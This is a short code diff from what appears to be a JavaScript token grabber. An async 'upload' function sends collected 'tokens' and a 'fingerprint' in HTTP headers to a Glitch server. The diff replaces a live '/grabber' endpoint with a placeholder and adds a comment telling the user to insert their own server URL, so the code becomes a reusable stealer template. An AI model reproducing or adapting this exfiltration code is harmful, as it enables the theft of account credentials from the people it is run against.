@@ -36,7 +36,8 @@
         }
         (async function upload () {
             try{
-                https.get("https://scratched-citrus.glitch.me/grabber", { headers: { "tokens": tokens, "fingerprint": fingerprint } });
+                // Insert your serverfile's URL here!
+                https.get("https://example.glitch.me/example", { headers: { "tokens": tokens, "fingerprint": fingerprint } });
             } catch (e) {
 
             }
